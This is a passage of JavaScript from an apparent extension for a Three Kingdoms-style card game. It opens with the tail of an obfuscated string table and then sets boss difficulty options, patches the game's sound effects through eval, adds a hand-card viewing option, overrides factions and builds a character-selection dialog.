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','xNXMW5FdNq','v8oLWQhdQYyDiSoxWOj4nuu4W77cMW','lMD6Axa','qGVcMSokorDWEXjxw8krz8kPW4C','W4/cLLJdLq','mtiWmJm1mKX2DgXdta','kcGOlISPkYKRksSK','zg9JDw1LBNq','lNPPCa','zgf0yvrYyw5ZzMvY','CNFdPfft','W73dSZq4','W4xdLSkzW4SMWO9HrCoWWRtcHq','yCoeW5VcT8kyW7dcLSkcu8kAW7C','bSk7WQRdUMm4jW8','W5NdTJCUmmo0','WRH4WQ9sWPLIgwJdS8k7W6S','W7zTWQDdWPjOkwNdTCk5WQdLG7lOO63MLklMLlDtpJC3z0FdHSkArSo2wmkqrq','B1bXW7VdUG','y3jLyxrLt2jQzwn0vvjm','u8kkoSkuhCkl','WQfmlJpcGSkkqG','CM91DgvY','W4ncW7NcQJVdUq','y3jLyxrLrwXLBwvUDa','WO8cCCkWnwpcGW','nJGXtgzrrhzt','WQjEA8oqWRe','v8kWW4BdQK7cJSk4lW9Rdmkwwsu','zhjHz292zxi','rmkTWRRdQeOWWOSWWO8FoCob','B8omyw1O','qMXVyG','qmo4WPFdVIara8os','l25VBMfTzs91BNPPCa','B25MCMvL','r8ocmbfinG','mSkicmooW4NdQY3cQdRcPSo3amkwW69UW7i','y29UC3rYDwn0B3i','WO7cR2HIy8oYWQVcRrBdKba','WPuNb1Gyq8oFWPFdPX/cShic','W5pdOCkT','zMLSzxm','W4VcRmoLDa','W5NcOSo1zq','ndi2mZe3nvPvvNHTza','ndq4odKYAwLPrgLJ','nCo9W4FcK8k5W6tcLG','bLVdLCksyKqltt5CyCk/yq','yM9KEq','z8obssJcGCkVW7VcTa7cIuRcVuC','WPBcQ8o/W4/cL8oKW67dPay','W6SrW4FcOa','CMvXDwLYzq','lNH6','lMX6B3a','k8onj2ddP0ykWPVcQSk3amkBW5/cI8oQ','awT+WPC','Fmo3W7u','ahnlWO3cOeSWW7NcSGmPW49bWPxcTxRcJmkXW74+WQHqb8oOWONcNG','dNxdJJu','lMX6Bwe','BmotDxG','WP5tmmk8pdhdUZtdOCorWPOnD8kjW7W','BLdcR0CLWRP8rfP0WRdcJSkktqVdTW'];li1jfn1T=function(){return Uv;};return li1jfn1T();}

    if (config.qingyao_bossjianglin) {
        lib.qyArenaReadyPushOrRunStart(function () {
            var name = lib.characterPack['假装无敌Pack'];
            for (var i in name) {
                if (name[i][4].indexOf('qyboss') != -1) {
                    name[i][4].removeArray(['hiddenboss', 'boss']);
                }
            }
        });
    }

    if (config.qingyao_bossdifficulty !== 'difficult') {
        lib.qyArenaReadyPushOrRunStart(function () {
            var name = lib.characterPack['假装无敌Pack'];
            for (var i in name) {
                if (name[i][4].indexOf('qyboss') != -1) {
                    name[i][3].add('ymxuwang');
                }
            }
        });
    }
    if (config.qingyao_bossdifficulty !== 'easy') {
        lib.qyArenaReadyPushOrRunStart(function () {
            var name = lib.characterPack['假装无敌Pack'];
            for (var i in name) {
                if (name[i][4].indexOf('qyboss') != -1) {
                    name[i][4].add('defense');
                }
            }
        });
    }
    // 手杀配音
    if (config.qingyao_shoushapeiyin) {
        if (lib.skill.qilin_skill) lib.skill.qilin_skill.audio = "ext:清瑶葭绮/members/假装无敌:true";
        if (lib.skill.qibaodao2) lib.skill.qibaodao2.audio = "ext:清瑶葭绮/members/假装无敌:true";
        if (lib.skill.lanyinjia) lib.skill.lanyinjia.audio = "ext:清瑶葭绮/members/假装无敌:true";
        if (lib.skill.cixiong_skill) lib.skill.cixiong_skill.audio = "ext:清瑶葭绮/members/假装无敌:true";
        lib.skill._qy_chongzhu = {
            trigger: {
                player: "_chongzhuBegin",
            },
            direct: true,
            popup: false,
            silent: true,
            priority: 0,
            content: function () {
                game.playqysstx('qy_chongzhu_' + (player.sex == 'female' ? 'female' : 'male'));
            },
        };

        function newFedit(str, ins) {
            var CAFstr = str.slice(str.indexOf("{") + 1).slice(0, -1);
            return ins(CAFstr);
        }

        function modifyFunction(funcName, pattern, replacement) {
            let CAFst = lib.element.content[funcName].toString();
            let ins = function (str) {
                return str.replace(pattern, replacement);
            };
            eval(`lib.element.content.${funcName}=function(){` + newFedit(CAFst, ins) + `}`);
        }

        modifyFunction(
            'link',
            /game\.playAudio\s*\(\s*'effect'\s*,\s*'link'\s*\)\s*;/g,
            `;if(!player.isLinked()){
                game['playAudio']('effect','link');
            }else {
                game.playqysstx('qy_tiesuo');
            }`
        );

        modifyFunction(
            'damage',
            /game\.playAudio\s*\(\s*'effect'\s*,\s*'damage'\s*\+\s*\(\s*num\s*>\s*1\s*\?\s*'2'\s*:\s*''\s*\)\s*\)\s*;/g,
            `;if(num > player.hujia){
                if(event.card&&event.card.name=='shandian'){
                    game.playqysstx('qy_shandian');
                }else if(['fire','thunder','ice','kami'].contains(event.nature)){
                    game.playqysstx('qy_damage_'+event.nature+(num>1?'2':''));
                }else {
                    game.playqysstx('qy_damage'+(num>1?'2':''));
                }
            };`
        );

        modifyFunction(
            'loseHp',
            /game\.playAudio\s*\(\s*'effect'\s*,\s*'loseHp'\s*\)\s*;/g,
            `game.playqysstx('qy_loseHp');`
        );

        lib.qyArenaReadyPushOrRunStart(() => {
            modifyFunction('changeHujia', /player\.hujia\s*\+\=\s*num/gi, `;
                player.hujia += num;
                if(player.hujia >= 0 && num < 0){
                    game.playqysstx('qy_hujia');
                }`
            );
        });
    }
    // 手牌可视化
    if (config.qingyao_shoupaikeshi) {
        lib.skill._qingyao_shoupaikeshi = {
            locked: true,
            ai: {
                viewHandcard: true,
                skillTagFilter: function (player, tag, arg) {
                    if (game.me == arg) return false;
                    if (!game.me.getFriends().contains(arg)) return false;
                },
            },
        };
    }
    // 官方势力
    if (config.qingyao_guanfangshili) {
        //lib.group=['shen','wei','shu','wu','qun','jin','qingyao_xian'];
        Object.defineProperty(lib, 'group', {
            get: function () {
                return ['shen', 'wei', 'shu', 'wu', 'qun', 'jin'];
            },
            set: function () {
            },
        });
        lib.skill._qingyao_guanfangshili = {
            trigger: {
                global: 'gameStart',
                player: 'enterGame',
            },
            forced: true,
            popup: false,
            silent: true,
            priority: 523,
            filter: function (event, player) {
                var mode = get.mode();
                if (mode != 'guozhan') {
                    if (player.group == 'qingyao_xian') return false;
                    return !lib.group.contains(player.group);
                }
                if (mode == 'guozhan') {
                    if (lib.character[player.name1][1] == 'qingyao_xian') return false;
                    if (lib.character[player.name2][1] == 'qingyao_xian') return false;
                    if (lib.character[player.name1][1] == 'ye') return false;
                    if (lib.character[player.name2][1] == 'ye') return false;
                    return !lib.group.contains(lib.character[player.name1][1]) || !lib.group.contains(lib.character[player.name2][1]);
                }
            },
            content: function () {
                'step 0'
                //game.showIdentity(true);
                var list = lib.group.slice(1, 6);
                player.chooseControl(list).set('prompt', '请选择替换的势力').set('ai', function () {
                    return list.randomGet();
                });
                'step 1'
                var mode = get.mode();
                var group = player.group;
                if (mode != 'guozhan') player.group = result.control;
                else {
                    lib.character[player.name1][1] = result.control;
                    lib.character[player.name2][1] = result.control;
                }
                var list = [];
                var players = game.players.concat(game.dead);
                for (var i = 0; i < players.length; i++) {
                    list.add(players[i].name);
                    list.add(players[i].name1);
                    list.add(players[i].name2);
                }
                for (var i in lib.character) {
                    if (list.contains(i)) continue;
                    if (lib.character[i][1] == group) lib.character[i][1] = result.control;
                }
                for (var i in lib.character) {
                    if (list.contains(i)) continue;
                    if (!lib.group.contains(lib.character[i][1])) lib.character[i][1] = lib.group.randomGet();
                }
            },
        };
    }
    // AI选将
    if (config.qingyao_AIxuanjiang) {
        lib.group.add('qingyao_xian');
        lib.translate.qingyao_xian = '仙';
        lib.translate.qingyao_xian2 = '仙';
        lib.groupnature.qingyao_xian = 'qingyao_xian';
        ui.create.groupControl = function (dialog) {
            return ui.create.control('wei', 'shu', 'wu', 'qun', 'jin', 'western', 'qingyao_xian', function (link, node) {
                if (link == '全部') {
                    dialog.currentcapt = '';
                    dialog.currentgroup = '';
                    for (var i = 0; i < dialog.buttons.length; i++) {
                        dialog.buttons[i].style.display = '';
                    }
                } else {
                    if (node.classList.contains('thundertext')) {
                        dialog.currentgroup = null;
                        dialog.currentgroupnode = null;
                        node.classList.remove('thundertext');
                        for (var i = 0; i < dialog.buttons.length; i++) {
                            if (dialog.currentcapt && dialog.buttons[i].capt != dialog.getCurrentCapt(dialog.buttons[i].link, dialog.buttons[i].capt)) {
                                dialog.buttons[i].classList.add('nodisplay');
                            } else {
                                dialog.buttons[i].classList.remove('nodisplay');
                            }
                        }
                    } else {
                        if (dialog.currentgroupnode) {
                            dialog.currentgroupnode.classList.remove('thundertext');
                        }
                        dialog.currentgroup = link;
                        dialog.currentgroupnode = node;
                        node.classList.add('thundertext');
                        for (var i = 0; i < dialog.buttons.length; i++) {
                            if (dialog.buttons[i].group != link ||
                                (dialog.currentcapt && dialog.buttons[i].capt != dialog.getCurrentCapt(dialog.buttons[i].link, dialog.buttons[i].capt))) {
                                dialog.buttons[i].classList.add('nodisplay');
                            } else {
                                dialog.buttons[i].classList.remove('nodisplay');
                            }
                        }
                    }
                }
            });
        };
        //
        var characterRandomGets = Object.keys(lib.character).randomGets(parseInt(lib.config.recent_character_number));
        lib.characterDialogGroup['随机'] = function (name, capt) {
            return characterRandomGets.contains(name) ? capt : null;
        }

        var createDialog = {
            characterDialog: function () {
                var filter = function (name) {
                    var info = lib.character[name];
                    return info && info[1] === 'key';
                }, str, noclick, thisiscard, seperate, expandall, onlypack, target, heightset, precharacter, characterx;
                for (var i = 0; i < arguments.length; i++) {
                    if (arguments[i] === 'thisiscard') {
                        thisiscard = true;
                    } else if (get.itemtype(arguments[i]) === 'player') {
                        target = arguments[i];
                    } else if (arguments[i] === 'expandall') {
                        expandall = true;
                    } else if (arguments[i] === 'heightset') {
                        heightset = true;
                    } else if (arguments[i] == 'precharacter') {
                        precharacter = true;
                    } else if (arguments[i] == 'characterx') {
                        characterx = true;
                    } else if (typeof arguments[i] == 'string' && arguments[i].indexOf('onlypack:') == 0) {
                        onlypack = arguments[i].slice(9);
                    } else if (typeof arguments[i] == 'object' && typeof arguments[i].seperate == 'function') {
                        seperate = arguments[i].seperate;
                    } else if (typeof arguments[i] === 'string') {
                        str = arguments[i];
                    } else if (typeof arguments[i] === 'function') {
                        filter = arguments[i];
                    } else if (typeof arguments[i] == 'boolean') {
                        noclick = arguments[i];
                    }
                }
                var list = [];
                var dialog;
                var node = ui.create.div('.caption.pointerspan');
                if (get.is.phoneLayout()) {
                    node.style.fontSize = '30px';
                }
                var namecapt = [];
                var getCapt = function (str) {
                    var capt;
                    if (str.indexOf('_') == -1) {
                        capt = str[0];
                    } else {
                        capt = str[str.lastIndexOf('_') + 1];
                    }
                    capt = capt.toLowerCase();
                    if (!/[a-z]/i.test(capt)) {
                        capt = '自定义';
                    }
                    return capt;
                }
                if (thisiscard) {
                    for (var i in lib.card) {
                        if (!lib.translate[i + '_info']) continue;
                        if (filter && filter(i)) continue;
                        list.push(['', get.translation(lib.card[i].type), i]);
                        if (namecapt.indexOf(getCapt(i)) == -1) {
                            namecapt.push(getCapt(i));
                        }
                    }
                } else {
                    for (var i in lib.character) {
                        if (!lib.character[i] || !Array.isArray(lib.character[i][4])) continue;
                        if (lib.character[i][4].contains('minskin')) continue;
                        if (lib.character[i][4].contains('boss') || lib.character[i][4].contains('hiddenboss')) {
                            if (lib.config.mode == 'boss') continue;
                            if (!lib.character[i][4].contains('bossallowed')) continue;
                        }

                        if (lib.character[i][4].contains('stonehidden')) continue;
                        if (lib.character[i][4].contains('unseen')) continue;
                        if (lib.character[i][1] === 'key' || i.indexOf('key_') === 0) continue;
                        if (lib.config.banned.contains(i)) continue;
                        if (lib.characterFilter[i] && !lib.characterFilter[i](get.mode())) continue;
                        if (filter && filter(i)) continue;
                        list.push(i);
                        if (namecapt.indexOf(getCapt(i)) == -1) {
                            namecapt.push(getCapt(i));
                        }
                    }
                }
                namecapt.sort(function (a, b) {
                    return a > b ? 1 : -1;
                });
                if (!thisiscard) {
                    namecapt.remove('自定义');
                    namecapt.push('newline');
                    for (var i in lib.characterDialogGroup) {
                        namecapt.push(i);
                    }
                }
                var newlined = false;
                var newlined2;
                var packsource;
                var clickCapt = function (e) {
                    if (_status.dragged) return;
                    if (dialog.currentcapt2 == '最近' && dialog.currentcaptnode2 != this && !dialog.currentcaptnode2.inited) {
                        dialog.currentcapt2 = null;
                        dialog.currentcaptnode2.classList.remove('thundertext');
                        dialog.currentcaptnode2.inited = true;
                        dialog.currentcaptnode2 = null;
                    }
                    if (this.alphabet) {
                        if (this.classList.contains('thundertext')) {
                            dialog.currentcapt = null;
                            dialog.currentcaptnode = null;
                            this.classList.remove('thundertext');
                            if (this.touchlink) {
                                this.touchlink.classList.remove('active');
                            }
                            for (var i = 0; i < dialog.buttons.length; i++) {
                                if (dialog.currentgroup && dialog.buttons[i].group != dialog.currentgroup) {
                                    dialog.buttons[i].classList.add('nodisplay');
                                } else if (dialog.currentcapt2 && dialog.buttons[i].capt != dialog.getCurrentCapt(dialog.buttons[i].link, dialog.buttons[i].capt, true)) {
                                    dialog.buttons[i].classList.add('nodisplay');
                                } else {
                                    dialog.buttons[i].classList.remove('nodisplay');
                                }
                            }
                        } else {
                            if (dialog.currentcaptnode) {
                                dialog.currentcaptnode.classList.remove('thundertext');
                                if (dialog.currentcaptnode.touchlink) {
                                    dialog.currentcaptnode.touchlink.classList.remove('active');
                                }
                            }
                            dialog.currentcapt = this.link;
                            dialog.currentcaptnode = this;
                            this.classList.add('thundertext');
                            if (this.touchlink) {
                                this.touchlink.classList.add('active');
                            }
                            for (var i = 0; i < dialog.buttons.length; i++) {
                                if (dialog.buttons[i].capt != dialog.getCurrentCapt(dialog.buttons[i].link, dialog.buttons[i].capt)) {
                                    dialog.buttons[i].classList.add('nodisplay');
                                } else if (dialog.currentcapt2 && dialog.buttons[i].capt != dialog.getCurrentCapt(dialog.buttons[i].link, dialog.buttons[i].capt, true)) {
                                    dialog.buttons[i].classList.add('nodisplay');
                                } else if (dialog.currentgroup && dialog.buttons[i].group != dialog.currentgroup) {
                                    dialog.buttons[i].classList.add('nodisplay');
                                } else {
                                    dialog.buttons[i].classList.remove('nodisplay');
                                }
                            }
                        }
                    } else {
                        if (newlined2) {
                            newlined2.style.display = 'none';
                            if (!packsource.onlypack) {
                                packsource.classList.remove('thundertext');
                                if (!get.is.phoneLayout() || !lib.config.filternode_button) {
                                    packsource.innerHTML = '武将包';
                                }
                            }
                        }
                        if (this.classList.contains('thundertext')) {
                            dialog.currentcapt2 = null;
                            dialog.currentcaptnode2 = null;
                            this.classList.remove('thundertext');
                            if (this.touchlink) {
                                this.touchlink.classList.remove('active');
                            }
                            for (var i = 0; i < dialog.buttons.length; i++) {
                                if (dialog.currentgroup && dialog.buttons[i].group != dialog.currentgroup) {
                                    dialog.buttons[i].classList.add('nodisplay');
                                } else if (dialog.currentcapt && dialog.buttons[i].capt != dialog.getCurrentCapt(dialog.buttons[i].link, dialog.buttons[i].capt)) {
                                    dialog.buttons[i].classList.add('nodisplay');
                                } else {
                                    dialog.buttons[i].classList.remove('nodisplay');
                                }
                            }
                        } else {
                            if (dialog.currentcaptnode2) {
                                dialog.currentcaptnode2.classList.remove('thundertext');
                                if (dialog.currentcaptnode2.touchlink) {
                                    dialog.currentcaptnode2.touchlink.classList.remove('active');
                                }
                            }
                            dialog.currentcapt2 = this.link;
                            dialog.currentcaptnode2 = this;
                            this.classList.add('thundertext');
                            if (dialog.currentcapt2 === '随机') {
                                let identity = target && target.identity;
                                if (get.mode() === 'guozhan') identity = 'num';
                                characterRandomGets = Object.keys(lib.character).randomGets(get.config(`choice_${identity}`) || 3);
                            }
                            if (this.touchlink) {
                                this.touchlink.classList.add('active');
                            } else if (this.parentNode == newlined2) {
                                packsource.innerHTML = this.innerHTML;
                                packsource.classList.add('thundertext');
                            }
                            for (var i = 0; i < dialog.buttons.length; i++) {
                                if (dialog.currentcapt && dialog.buttons[i].capt != dialog.getCurrentCapt(dialog.buttons[i].link, dialog.buttons[i].capt)) {
                                    dialog.buttons[i].classList.add('nodisplay');
                                } else if (dialog.buttons[i].capt != dialog.getCurrentCapt(dialog.buttons[i].link, dialog.buttons[i].capt, true)) {
                                    dialog.buttons[i].classList.add('nodisplay');
                                } else if (dialog.currentgroup && dialog.buttons[i].group != dialog.currentgroup) {
                                    dialog.buttons[i].classList.add('nodisplay');
                                } else {
                                    if (dialog.buttons[i].activate) {
                                        dialog.buttons[i].activate();
                                    }
                                    dialog.buttons[i].classList.remove('nodisplay');
                                }
                            }
                        }
                    }
                    if (dialog.seperate) {
                        for (var i = 0; i < dialog.seperate.length; i++) {
                            if (!dialog.seperate[i].nextSibling.querySelector('.button:not(.nodisplay)')) {
                                dialog.seperate[i].style.display = 'none';
                                dialog.seperate[i].nextSibling.style.display = 'none';
                            } else {
                                dialog.seperate[i].style.display = '';
                                dialog.seperate[i].nextSibling.style.display = '';
                            }
                        }
                    }
                    if (filternode) {
                        if (filternode.querySelector('.active')) {
                            packsource.classList.add('thundertext');
                        } else {
                            packsource.classList.remove('thundertext');
                        }
                    }
                    if (e) e.stopPropagation();
                };
                for (i = 0; i < namecapt.length; i++) {
                    if (namecapt[i] == 'newline') {
                        newlined = document.createElement('div');
                        newlined.style.marginTop = '5px';
                        newlined.style.display = 'block';
                        // newlined.style.fontFamily='xinwei';
                        if (get.is.phoneLayout()) {
                            newlined.style.fontSize = '32px';
                        } else {
                            newlined.style.fontSize = '22px';
                        }
                        newlined.style.textAlign = 'center';
                        node.appendChild(newlined);
                    } else if (newlined) {
                        var span = ui.create.div('.tdnode.pointerdiv.shadowed.reduce_radius');
                        span.style.margin = '3px';
                        span.style.width = 'auto';
                        span.innerHTML = ' ' + namecapt[i].toUpperCase() + ' ';
                        span.link = namecapt[i];
                        span.addEventListener(lib.config.touchscreen ? 'touchend' : 'click', clickCapt);
                        newlined.appendChild(span);
                        node[namecapt[i]] = span;
                        if (namecapt[i] == '收藏') {
                            span._nature = 'fire';
                        } else {
                            span._nature = 'wood';
                        }
                    } else {
                        var span = document.createElement('span');
                        span.innerHTML = ' ' + namecapt[i].toUpperCase() + ' ';
                        span.link = namecapt[i];
                        span.alphabet = true;
                        span.addEventListener(lib.config.touchscreen ? 'touchend' : 'click', clickCapt);
                        node.appendChild(span);
                    }
                }
                if (!thisiscard) {
                    var groups = ['wei', 'shu', 'wu', 'qun', 'jin', 'qingyao_xian'];
                    var bool1 = false;
                    var bool2 = false;
                    var bool3 = (get.mode() == 'guozhan' && _status.forceKey != true && get.config('onlyguozhan'));
                    var bool4 = (get.mode() != 'guozhan');
                    for (var i in lib.character) {
                        if (lib.character[i][1] == 'shen') {
                            bool1 = true;
                        }
                        if (bool3 || lib.character[i][1] == 'qingyao_xian') {
                            bool2 = true;
                        }
                        if (!bool4 && get.is.double(i)) bool4 = true;
                        if (bool1 && bool2 && bool4) break;
                    }
                    if (bool1) groups.add('shen');
                    if (bool4) groups.add('double');

                    for (let i in lib.character) {
                        let characterElement = lib.character[i];
                        if (!characterElement) continue;
                        var characterElementGroup = characterElement[1];
                        if (groups.includes(characterElementGroup)) continue;
